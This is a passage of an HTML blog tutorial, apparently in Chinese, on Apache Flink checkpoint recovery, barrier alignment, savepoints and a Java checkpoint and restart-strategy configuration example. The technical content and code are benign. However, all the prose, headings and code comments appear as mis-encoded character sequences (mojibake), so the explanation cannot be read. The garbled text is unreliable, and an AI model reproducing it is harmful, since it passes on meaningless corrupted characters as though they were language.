¹æ®å¥‡å¶æ€§åˆ†æµï¼Œå¶æ•°æµæ±‚å¶æ•°å’Œï¼Œå¥‡æ•°æµæ±‚å¥‡æ•°å’Œï¼Œ5è¿™é‡Œæ˜æ˜¾å·²ç»è¢«sum_oddï¼ˆ1+3+5ï¼‰å¤„ç†äº†ï¼Œä¸”sum_evenä¸éœ€è¦å¤„ç†è¯¥æ•°æ®ï¼Œå› ä¸ºå‰é¢å·²ç»åˆ¤æ–­è¯¥æ•°æ®ä¸éœ€è¦åˆ°sum_evenæµï¼Œç›¸å½“äºæ‰€æœ‰ä»»åŠ¡éƒ½å·²ç»å¤„ç†å®Œsourceçš„æ•°æ®5äº†ã€‚ï¼‰</em> </li><li> åœ¨JobManagerä¸­ä¹Ÿæœ‰ä¸ªChechpointçš„æŒ‡é’ˆï¼ŒæŒ‡å‘äº†ä»“åº“çš„çŠ¶æ€å¿«ç…§çš„ä¸€ä¸ªæ‹“æ‰‘å›¾ï¼Œä¸ºä»¥åçš„æ•°æ®æ•…éšœæ¢å¤åšå‡†å¤‡ </li></ul><h4 id="ä»æ£€æŸ¥ç‚¹æ¢å¤çŠ¶æ€"><a href="#ä»æ£€æŸ¥ç‚¹æ¢å¤çŠ¶æ€" class="headerlink" title="ä»æ£€æŸ¥ç‚¹æ¢å¤çŠ¶æ€"></a>ä»æ£€æŸ¥ç‚¹æ¢å¤çŠ¶æ€</h4><p><img src="https://img-blog.csdnimg.cn/20200529220326395.png###id=Y7K5x&originHeight=186&originWidth=579&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> åœ¨æ‰§è¡Œæµåº”ç”¨ç¨‹åºæœŸé—´ï¼ŒFlink ä¼šå®šæœŸä¿å­˜çŠ¶æ€çš„ä¸€è‡´æ£€æŸ¥ç‚¹ </li><li> å¦‚æœå‘ç”Ÿæ•…éšœï¼Œ Flink å°†ä¼šä½¿ç”¨æœ€è¿‘çš„æ£€æŸ¥ç‚¹æ¥ä¸€è‡´æ¢å¤åº”ç”¨ç¨‹åºçš„çŠ¶æ€ï¼Œå¹¶é‡æ–°å¯åŠ¨å¤„ç†æµç¨‹<br>ï¼ˆ<strong>å¦‚å›¾ä¸­æ‰€ç¤ºï¼Œ7è¿™ä¸ªæ•°æ®è¢«sourceè¯»åˆ°äº†ï¼Œå‡†å¤‡ä¼ ç»™å¥‡æ•°æµæ—¶ï¼Œå¥‡æ•°æµå®•æœºäº†ï¼Œæ•°æ®ä¼ è¾“å‘ç”Ÿä¸­æ–­</strong>ï¼‰ </li></ul><p><img src="https://img-blog.csdnimg.cn/20200529220452315.png###id=TC1ql&originHeight=179&originWidth=590&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> é‡åˆ°æ•…éšœä¹‹åï¼Œç¬¬ä¸€æ­¥å°±æ˜¯é‡å¯åº”ç”¨<br>(<strong>é‡å¯åï¼Œèµ·åˆæµéƒ½æ˜¯ç©ºçš„</strong>) </li></ul><p><img src="https://img-blog.csdnimg.cn/20200529220546658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=DIQul&originHeight=335&originWidth=590&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> ç¬¬äºŒæ­¥æ˜¯ä» checkpoint ä¸­è¯»å–çŠ¶æ€ï¼Œå°†çŠ¶æ€é‡ç½®<br><em>(<strong>è¯»å–åœ¨è¿œç¨‹ä»“åº“</strong>(Storageï¼Œè¿™é‡Œçš„ä»“åº“æŒ‡çŠ¶æ€åç«¯ä¿å­˜æ•°æ®æŒ‡å®šçš„ä¸‰ç§æ–¹å¼ä¹‹ä¸€)<strong>ä¿å­˜çš„çŠ¶æ€</strong>)</em> </li><li> ä»æ£€æŸ¥ç‚¹é‡æ–°å¯åŠ¨åº”ç”¨ç¨‹åºåï¼Œå…¶å†…éƒ¨çŠ¶æ€ä¸æ£€æŸ¥ç‚¹å®Œæˆæ—¶çš„çŠ¶æ€å®Œå…¨ç›¸åŒ </li></ul><p><img src="https://img-blog.csdnimg.cn/20200529220850257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=YEVg0&originHeight=205&originWidth=533&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> ç¬¬ä¸‰æ­¥ï¼šå¼€å§‹æ¶ˆè´¹å¹¶å¤„ç†æ£€æŸ¥ç‚¹åˆ°å‘ç”Ÿæ•…éšœä¹‹é—´çš„æ‰€æœ‰æ•°æ® </li><li> <strong>è¿™ç§æ£€æŸ¥ç‚¹çš„ä¿å­˜å’Œæ¢å¤æœºåˆ¶å¯ä»¥ä¸ºåº”ç”¨ç¨‹åºçŠ¶æ€æä¾›â€œç²¾ç¡®ä¸€æ¬¡â€ï¼ˆexactly-onceï¼‰çš„ä¸€è‡´æ€§ï¼Œå› ä¸ºæ‰€æœ‰ç®—å­éƒ½ä¼šä¿å­˜æ£€æŸ¥ç‚¹å¹¶æ¢å¤å…¶æ‰€æœ‰çŠ¶æ€ï¼Œè¿™æ ·ä¸€æ¥æ‰€æœ‰çš„è¾“å…¥æµå°±éƒ½ä¼šè¢«é‡ç½®åˆ°æ£€æŸ¥ç‚¹å®Œæˆæ—¶çš„ä½ç½®</strong><br><em>ï¼ˆè¿™é‡Œè¦æ±‚sourceæºä¹Ÿèƒ½è®°å½•çŠ¶æ€ï¼Œå›é€€åˆ°è¯»å–æ•°æ®7çš„çŠ¶æ€ï¼Œkafkaæœ‰ç›¸åº”çš„åç§»æŒ‡é’ˆèƒ½å®Œæˆè¯¥æ“ä½œï¼‰</em> </li></ul><h4 id="Flinkæ£€æŸ¥ç‚¹ç®—æ³•"><a href="#Flinkæ£€æŸ¥ç‚¹ç®—æ³•" class="headerlink" title="Flinkæ£€æŸ¥ç‚¹ç®—æ³•"></a>Flinkæ£€æŸ¥ç‚¹ç®—æ³•</h4><h5 id="æ¦‚è¿°-3"><a href="#æ¦‚è¿°-3" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h5><p><strong>checkpointå’ŒWatermarkä¸€æ ·ï¼Œéƒ½ä¼šä»¥å¹¿æ’­çš„å½¢å¼å‘Šè¯‰æ‰€æœ‰ä¸‹æ¸¸ã€‚</strong></p><hr><ul><li> ä¸€ç§ç®€å•çš„æƒ³æ³•<br>æš‚åœåº”ç”¨ï¼Œä¿å­˜çŠ¶æ€åˆ°æ£€æŸ¥ç‚¹ï¼Œå†é‡æ–°æ¢å¤åº”ç”¨ï¼ˆå½“ç„¶Flink ä¸æ˜¯é‡‡ç”¨è¿™ç§ç®€å•ç²—æš´çš„æ–¹å¼ï¼‰ </li><li>Flinkçš„æ”¹è¿›å®ç° <ul><li>åŸºäºChandy-Lamportç®—æ³•çš„åˆ†å¸ƒå¼å¿«ç…§</li><li>å°†æ£€æŸ¥ç‚¹çš„ä¿å­˜å’Œæ•°æ®å¤„ç†åˆ†ç¦»å¼€ï¼Œä¸æš‚åœæ•´ä¸ªåº”ç”¨</li></ul></li></ul><p>ï¼ˆå°±æ˜¯æ¯ä¸ªä»»åŠ¡å•ç‹¬æ‹æ‘„è‡ªå·±çš„å¿«ç…§åˆ°å†…å­˜ï¼Œä¹‹åå†åˆ°jobManageræ•´åˆï¼‰ </p><hr><ul><li>æ£€æŸ¥ç‚¹åˆ†ç•Œçº¿ï¼ˆCheckpoint Barrierï¼‰ <ul><li>Flinkçš„æ£€æŸ¥ç‚¹ç®—æ³•ç”¨åˆ°äº†ä¸€ç§ç§°ä¸ºåˆ†ç•Œçº¿ï¼ˆbarrierï¼‰çš„ç‰¹æ®Šæ•°æ®å½¢å¼ï¼Œç”¨æ¥æŠŠä¸€æ¡æµä¸Šæ•°æ®æŒ‰ç…§ä¸åŒçš„æ£€æŸ¥ç‚¹åˆ†å¼€</li><li><strong>åˆ†ç•Œçº¿ä¹‹å‰åˆ°æ¥çš„æ•°æ®å¯¼è‡´çš„çŠ¶æ€æ›´æ”¹ï¼Œéƒ½ä¼šè¢«åŒ…å«åœ¨å½“å‰åˆ†ç•Œçº¿æ‰€å±çš„æ£€æŸ¥ç‚¹ä¸­ï¼›è€ŒåŸºäºåˆ†ç•Œçº¿ä¹‹åçš„æ•°æ®å¯¼è‡´çš„æ‰€æœ‰æ›´æ”¹ï¼Œå°±ä¼šè¢«åŒ…å«åœ¨ä¹‹åçš„æ£€æŸ¥ç‚¹ä¸­</strong></li></ul></li></ul><h5 id="å…·ä½“è®²è§£"><a href="#å…·ä½“è®²è§£" class="headerlink" title="å…·ä½“è®²è§£"></a>å…·ä½“è®²è§£</h5><p><img src="https://img-blog.csdnimg.cn/20200529224034243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=jgnx2&originHeight=307&originWidth=637&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> ç°åœ¨æ˜¯ä¸€ä¸ªæœ‰ä¸¤ä¸ªè¾“å…¥æµçš„åº”ç”¨ç¨‹åºï¼Œç”¨å¹¶è¡Œçš„ä¸¤ä¸ª Source ä»»åŠ¡æ¥è¯»å– </li><li> ä¸¤æ¡è‡ªç„¶æ•°æ•°æ®æµï¼Œè“è‰²æ•°æ®æµå·²ç»è¾“å‡ºå®Œ<code>è“3</code>äº†ï¼Œé»„è‰²æ•°æ®æµè¾“å‡ºå®Œ<code>é»„4</code>äº† </li><li> åœ¨Souceç«¯ Source1 æ¥æ”¶åˆ°äº†æ•°æ®<code>è“3</code> æ­£åœ¨å¾€ä¸‹æ¸¸å‘å‘ä¸€ä¸ªæ•°æ®<code>è“2 å’Œ è“3</code>ï¼› Source2 æ¥å—åˆ°äº†æ•°æ®<code>é»„4</code>ï¼Œä¸”å¾€ä¸‹æ¸¸å‘é€æ•°æ®<code>é»„4</code> </li><li> å¶æ•°æµå·²ç»å¤„ç†å®Œ<code>é»„2</code> æ‰€ä»¥åé¢æ˜¾ç¤ºä¸º2ï¼Œ å¥‡æ•°æµå¤„ç†å®Œ<code>è“1 å’Œ é»„1 é»„3</code> æ‰€ä»¥ä¸º5ï¼Œå¹¶åˆ†åˆ«å¾€ä¸‹æ¸¸å‘é€æ¯æ¬¡èšåˆåçš„ç»“æœç»™Sink </li></ul><p><img src="https://img-blog.csdnimg.cn/20200529224517502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=qsxI1&originHeight=281&originWidth=681&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> <strong>JobManager ä¼šå‘æ¯ä¸ª source ä»»åŠ¡å‘é€ä¸€æ¡å¸¦æœ‰æ–°æ£€æŸ¥ç‚¹ ID çš„æ¶ˆæ¯</strong>ï¼Œé€šè¿‡è¿™ç§æ–¹å¼æ¥å¯åŠ¨æ£€æŸ¥ç‚¹<br><em>ï¼ˆè¿™ä¸ªå¸¦æœ‰æ–°æ£€æŸ¥ç‚¹IDçš„ä¸œè¥¿ä¸º<strong>barrier</strong>ï¼Œç”±å›¾ä¸­ä¸‰è§’å‹è¡¨ç¤ºï¼Œæ•°å€¼2åªæ˜¯IDï¼‰</em> </li></ul><p><img src="https://img-blog.csdnimg.cn/20200529224705177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=hhECw&originHeight=330&originWidth=604&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>æ•°æ®æºå°†å®ƒä»¬çš„çŠ¶æ€å†™å…¥æ£€æŸ¥ç‚¹ï¼Œå¹¶å‘å‡ºä¸€ä¸ªæ£€æŸ¥ç‚¹barrier</li><li>çŠ¶æ€åç«¯åœ¨çŠ¶æ€å­˜å…¥æ£€æŸ¥ç‚¹ä¹‹åï¼Œä¼šè¿”å›é€šçŸ¥ç»™sourceä»»åŠ¡ï¼Œsourceä»»åŠ¡å°±ä¼šå‘JobManagerç¡®è®¤æ£€æŸ¥ç‚¹å®Œæˆ</li></ul><pre><code>_ä¸Šå›¾ï¼Œåœ¨Sourceç«¯æ¥å—åˆ°barrieråï¼Œå°†è‡ªå·±æ­¤èº«çš„3 å’Œ 4 çš„æ•°æ®çš„çŠ¶æ€å†™å…¥æ£€æŸ¥ç‚¹ï¼Œä¸”å‘JobManagerå‘é€checkpointæˆåŠŸçš„æ¶ˆæ¯ï¼Œç„¶åå‘ä¸‹æ¸¸åˆ†åˆ«å‘å‡ºä¸€ä¸ªæ£€æŸ¥ç‚¹ barrier__å¯ä»¥çœ‹å‡ºåœ¨Sourceæ¥å—barrieræ—¶ï¼Œæ•°æ®æµä¹Ÿåœ¨ä¸æ–­çš„å¤„ç†ï¼Œä¸ä¼šè¿›è¡Œä¸­æ–­__æ­¤æ—¶çš„å¶æ•°æµå·²ç»å¤„ç†å®Œ_`_è“2_`_å˜æˆäº†4ï¼Œä½†æ˜¯è¿˜æ²¡å¤„ç†åˆ°_`_é»„4_`_ï¼Œåªæ˜¯ä¸‹æ¸¸sinkå‘é€äº†ä¸€ä¸ªæ•°æ®4ï¼Œè€Œå¥‡æ•°æµå·²ç»å¤„ç†å®Œ_`_è“3_`_å˜æˆäº†8ï¼ˆé»„1+è“1+é»„3+è“3ï¼‰ï¼Œå¹¶å‘ä¸‹æ¸¸sinkå‘é€äº†8__æ­¤æ—¶æ£€æŸ¥ç‚¹barrieréƒ½è¿˜æœªåˆ°Sum_oddå¥‡æ•°æµå’ŒSum_evenå¶æ•°æµ_</code></pre><p><img src="https://img-blog.csdnimg.cn/20200529225235834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=ZmcOH&originHeight=319&originWidth=590&originalType=binary&ratio=1&status=done&style=none"></p><ul><li><strong>åˆ†ç•Œçº¿å¯¹é½ï¼šbarrierå‘ä¸‹æ¸¸ä¼ é€’ï¼Œsumä»»åŠ¡ä¼šç­‰å¾…æ‰€æœ‰è¾“å…¥åˆ†åŒºçš„barrieråˆ°è¾¾</strong></li><li><strong>å¯¹äºbarrierå·²ç»è¾¾åˆ°çš„åˆ†åŒºï¼Œç»§ç»­åˆ°è¾¾çš„æ•°æ®ä¼šè¢«ç¼“å­˜</strong></li><li><strong>è€Œbarrierå°šæœªåˆ°è¾¾çš„åˆ†åŒºï¼Œæ•°æ®ä¼šè¢«æ­£å¸¸å¤„ç†</strong></li></ul><pre><code>_æ­¤æ—¶è“è‰²æµçš„barrierå…ˆä¸€æ­¥æŠµè¾¾äº†å¶æ•°æµï¼Œé»„è‰²çš„barrierè¿˜æœªåˆ°ï¼Œä½†æ˜¯å› ä¸ºæ•°æ®çš„ä¸ä¸­æ–­ä¸€ç›´å¤„ç†ï¼Œæ­¤æ—¶çš„å…ˆåˆ°çš„è“è‰²çš„barrierä¼šå°†æ­¤æ—¶çš„å¶æ•°æµçš„æ•°æ®4è¿›è¡Œç¼“å­˜å¤„ç†ï¼Œæµæ¥ç€å¤„ç†æ¥ä¸‹æ¥çš„æ•°æ®ç­‰å¾…ç€é»„è‰²çš„barrierçš„åˆ°æ¥ï¼Œè€Œé»„è‰²barrierä¹‹å‰çš„æ•°æ®å°†ä¼šå¯¹ç¼“å­˜çš„æ•°æ®ç›¸åŠ __è¿™æ¬¡å¤„ç†çš„æ€»ç»“ï¼š**åˆ†ç•Œçº¿å¯¹é½**ï¼š**barrier å‘ä¸‹æ¸¸ä¼ é€’ï¼Œsum ä»»åŠ¡ä¼šç­‰å¾…æ‰€æœ‰è¾“å…¥åˆ†åŒºçš„ barrier åˆ°è¾¾ï¼Œå¯¹äºbarrierå·²ç»åˆ°è¾¾çš„åˆ†åŒºï¼Œç»§ç»­åˆ°è¾¾çš„æ•°æ®ä¼šè¢«ç¼“å­˜ã€‚è€Œbarrierå°šæœªåˆ°è¾¾çš„åˆ†åŒºï¼Œæ•°æ®ä¼šè¢«æ­£å¸¸å¤„ç†**_</code></pre><p><img src="https://img-blog.csdnimg.cn/20200529225656902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=a9enr&originHeight=290&originWidth=633&originalType=binary&ratio=1&status=done&style=none"></p><ul><li><strong>å½“æ”¶åˆ°æ‰€æœ‰è¾“å…¥åˆ†åŒºçš„ barrier æ—¶ï¼Œä»»åŠ¡å°±å°†å…¶çŠ¶æ€ä¿å­˜åˆ°çŠ¶æ€åç«¯çš„æ£€æŸ¥ç‚¹ä¸­ï¼Œç„¶åå°† barrier ç»§ç»­å‘ä¸‹æ¸¸è½¬å‘</strong></li></ul><pre><code>_å½“è“è‰²çš„barrierå’Œé»„è‰²çš„barrier(æ‰€æœ‰åˆ†åŒºçš„)éƒ½åˆ°è¾¾åï¼Œè¿›è¡ŒçŠ¶æ€ä¿å­˜åˆ°è¿œç¨‹ä»“åº“ï¼Œ**ç„¶åå¯¹JobManagerå‘é€æ¶ˆæ¯ï¼Œè¯´è‡ªå·±çš„æ£€æŸ¥ç‚¹ä¿å­˜å®Œæ¯•äº†**__æ­¤æ—¶çš„å¶æ•°æµå’Œå¥‡æ•°æµéƒ½ä¸º8_</code></pre><p><img src="https://img-blog.csdnimg.cn/20200529230413317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=TKI2Z&originHeight=262&originWidth=643&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>å‘ä¸‹æ¸¸è½¬å‘æ£€æŸ¥ç‚¹ barrier åï¼Œä»»åŠ¡ç»§ç»­æ­£å¸¸çš„æ•°æ®å¤„ç†</li></ul><p><img src="https://img-blog.csdnimg.cn/2020052923042436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=A42fh&originHeight=297&originWidth=609&originalType=binary&ratio=1&status=done&style=none"></p><ul><li><strong>Sink ä»»åŠ¡å‘ JobManager ç¡®è®¤çŠ¶æ€ä¿å­˜åˆ° checkpoint å®Œæ¯•</strong></li><li><strong>å½“æ‰€æœ‰ä»»åŠ¡éƒ½ç¡®è®¤å·²æˆåŠŸå°†çŠ¶æ€ä¿å­˜åˆ°æ£€æŸ¥ç‚¹æ—¶ï¼Œæ£€æŸ¥ç‚¹å°±çœŸæ­£å®Œæˆäº†</strong></li></ul><h4 id="ä¿å­˜ç‚¹-Savepoints"><a href="#ä¿å­˜ç‚¹-Savepoints" class="headerlink" title="ä¿å­˜ç‚¹(Savepoints)"></a>ä¿å­˜ç‚¹(Savepoints)</h4><p><strong>CheckPointä¸ºè‡ªåŠ¨ä¿å­˜ï¼ŒSavePointä¸ºæ‰‹åŠ¨ä¿å­˜</strong></p><ul><li>Flinkè¿˜æä¾›äº†å¯ä»¥è‡ªå®šä¹‰çš„é•œåƒä¿å­˜åŠŸèƒ½ï¼Œå°±æ˜¯ä¿å­˜ç‚¹ï¼ˆsave pointsï¼‰</li><li>åŸåˆ™ä¸Šï¼Œåˆ›å»ºä¿å­˜ç‚¹ä½¿ç”¨çš„ç®—æ³•ä¸æ£€æŸ¥ç‚¹å®Œå…¨ç›¸åŒï¼Œå› æ­¤ä¿å­˜ç‚¹å¯ä»¥è®¤ä¸ºå°±æ˜¯å…·æœ‰ä¸€äº›é¢å¤–å…ƒæ•°æ®çš„æ£€æŸ¥ç‚¹</li><li>Flinkä¸ä¼šè‡ªåŠ¨åˆ›å»ºä¿å­˜ç‚¹ï¼Œå› æ­¤ç”¨æˆ·ï¼ˆæˆ–è€…å¤–éƒ¨è°ƒåº¦ç¨‹åºï¼‰å¿…é¡»æ˜ç¡®åœ°è§¦å‘åˆ›å»ºæ“ä½œ</li><li>ä¿å­˜ç‚¹æ˜¯ä¸€ä¸ªå¼ºå¤§çš„åŠŸèƒ½ã€‚é™¤äº†æ•…éšœæ¢å¤å¤–ï¼Œä¿å­˜ç‚¹å¯ä»¥ç”¨äºï¼šæœ‰è®¡åˆ’çš„æ‰‹åŠ¨å¤‡ä»½ã€æ›´æ–°åº”ç”¨ç¨‹åºã€ç‰ˆæœ¬è¿ç§»ã€æš‚åœå’Œé‡å¯ç¨‹åºï¼Œç­‰ç­‰</li></ul><h4 id="æ£€æŸ¥ç‚¹å’Œé‡å¯ç­–ç•¥é…ç½®"><a href="#æ£€æŸ¥ç‚¹å’Œé‡å¯ç­–ç•¥é…ç½®" class="headerlink" title="æ£€æŸ¥ç‚¹å’Œé‡å¯ç­–ç•¥é…ç½®"></a>æ£€æŸ¥ç‚¹å’Œé‡å¯ç­–ç•¥é…ç½®</h4><ul><li> javaæ ·ä¾‹ä»£ç   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.state;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.restartstrategy.RestartStrategies;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.contrib.streaming.state.RocksDBStateBackend;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.runtime.state.filesystem.FsStateBackend;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.runtime.state.memory.MemoryStateBackend;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.CheckpointingMode;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/2 11:35 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StateTest4_FaultTolerance</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. çŠ¶æ€åç«¯é…ç½®</span></span><br><span class="line">    env.setStateBackend(<span class="keyword">new</span> MemoryStateBackend());</span><br><span class="line">    env.setStateBackend(<span class="keyword">new</span> FsStateBackend(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="comment">// è¿™ä¸ªéœ€è¦å¦å¤–å¯¼å…¥ä¾èµ–</span></span><br><span class="line">    env.setStateBackend(<span class="keyword">new</span> RocksDBStateBackend(<span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. æ£€æŸ¥ç‚¹é…ç½® (æ¯300msè®©jobManagerè¿›è¡Œä¸€æ¬¡checkpointæ£€æŸ¥)</span></span><br><span class="line">    env.enableCheckpointing(<span class="number">300</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é«˜çº§é€‰é¡¹</span></span><br><span class="line">    env.getCheckpointConfig().setCheckpointingMode(CheckpointingMode.EXACTLY_ONCE);</span><br><span class="line">    <span class="comment">//Checkpointçš„å¤„ç†è¶…æ—¶æ—¶é—´</span></span><br><span class="line">    env.getCheckpointConfig().setCheckpointTimeout(<span class="number">60000L</span>);</span><br><span class="line">    <span class="comment">// æœ€å¤§å…è®¸åŒæ—¶å¤„ç†å‡ ä¸ªCheckpoint(æ¯”å¦‚ä¸Šä¸€ä¸ªå¤„ç†åˆ°ä¸€åŠï¼Œè¿™é‡Œåˆæ”¶åˆ°ä¸€ä¸ªå¾…å¤„ç†çš„Checkpointäº‹ä»¶)</span></span><br><span class="line">    env.getCheckpointConfig().setMaxConcurrentCheckpoints(<span class="number">2</span>);</span><br><span class="line">    <span class="comment">// ä¸ä¸Šé¢setMaxConcurrentCheckpoints(2) å†²çªï¼Œè¿™ä¸ªæ—¶é—´é—´éš”æ˜¯ å½“å‰checkpointçš„å¤„ç†å®Œæˆæ—¶é—´ä¸æ¥æ”¶æœ€æ–°ä¸€ä¸ªcheckpointä¹‹é—´çš„æ—¶é—´é—´éš”</span></span><br><span class="line">    env.getCheckpointConfig().setMinPauseBetweenCheckpoints(<span class="number">100L</span>);</span><br><span class="line">    <span class="comment">// å¦‚æœåŒæ—¶å¼€å¯äº†savepointä¸”æœ‰æ›´æ–°çš„å¤‡ä»½ï¼Œæ˜¯å¦å€¾å‘äºä½¿ç”¨æ›´è€çš„è‡ªåŠ¨å¤‡ä»½checkpointæ¥æ¢å¤ï¼Œé»˜è®¤false</span></span><br><span class="line">    env.getCheckpointConfig().setPreferCheckpointForRecovery(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// æœ€å¤šèƒ½å®¹å¿å‡ æ¬¡checkpointå¤„ç†å¤±è´¥ï¼ˆé»˜è®¤0ï¼Œå³checkpointå¤„ç†å¤±è´¥ï¼Œå°±å½“ä½œç¨‹åºæ‰§è¡Œå¼‚å¸¸ï¼‰</span></span><br><span class="line">    env.getCheckpointConfig().setTolerableCheckpointFailureNumber(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. é‡å¯ç­–ç•¥é…ç½®</span></span><br><span class="line">    <span class="comment">// å›ºå®šå»¶è¿Ÿé‡å¯(æœ€å¤šå°è¯•3æ¬¡ï¼Œæ¯æ¬¡é—´éš”10s)</span></span><br><span class="line">    env.setRestartStrategy(RestartStrategies.fixedDelayRestart(<span class="number">3</span>, <span class="number">10000L</span>));</span><br><span class="line">    <span class="comment">// å¤±è´¥ç‡é‡å¯(åœ¨10åˆ†é’Ÿå†…æœ€å¤šå°è¯•3æ¬¡ï¼Œæ¯æ¬¡è‡³å°‘é—´éš”1åˆ†é’Ÿ)</span></span><br><span class="line">    env.setRestartStrategy(RestartStrategies.failureRateRestart(<span class="number">3</span>, Time.minutes(<span class="number">10</span>), Time.minutes(<span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// socketæ–‡æœ¬æµ</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è½¬æ¢æˆSensorReadingç±»å‹</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    dataStream.print();</span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="çŠ¶æ€ä¸€è‡´æ€§"><a href="#çŠ¶æ€ä¸€è‡´æ€§" class="headerlink" title="çŠ¶æ€ä¸€è‡´æ€§"></a>çŠ¶æ€ä¸€è‡´æ€§</h4><blockquote><p><a 